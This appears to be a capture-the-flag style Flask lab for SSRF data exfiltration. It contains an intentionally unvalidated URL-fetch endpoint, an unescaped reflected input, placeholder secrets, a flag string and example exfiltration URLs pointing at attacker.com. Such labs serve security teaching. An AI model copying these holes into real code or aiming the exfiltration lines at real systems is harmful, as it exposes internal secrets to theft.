"""
SSRF Lab 10: Data Exfiltration via SSRF
Difficulty: 2 (Intermediate)
Points: 75

Description:
Using SSRF to exfiltrate internal data.
"""

from flask import Flask, request
import requests
from urllib.parse import quote

app = Flask(__name__)

INTERNAL_SECRETS = {
    'api_key': 'sk-1234567890abcdef',
    'db_password': 'DatabaseP@ssw0rd',
    'admin_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
}

@app.route('/')
def index():
    """
    VULNERABLE: Data exfiltration via SSRF
    
    Attack Vector:
    1. Set up attacker server that logs requests
    2. Access internal data and exfiltrate via parameter
    3. /?url=http://attacker.com/log?data=<DATA>
    4. Or use DNS exfiltration: /?url=http://<DATA>.attacker.com/
    
    Flag: FLAG{ssrf_data_exfil_010}
    """
    url = request.args.get('url', '')
    content = None
    error = None
    
    if url:
        try:
            # VULNERABLE: Can exfiltrate data in URLs
            response = requests.get(url, timeout=5)
            content = response.text[:500]
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>Data Exfiltration Lab</h1>
        <form method="GET">
            <input type="text" name="url" placeholder="Exfil URL" size="60" value="{url}">
            <button>Exfiltrate</button>
        </form>
        {f"<pre>{content}</pre>" if content else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

@app.route('/internal/api/secrets')
def secrets():
    """Internal secrets endpoint"""
    return f"API Key: {INTERNAL_SECRETS['api_key']}, DB: {INTERNAL_SECRETS['db_password']}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5010, debug=False)
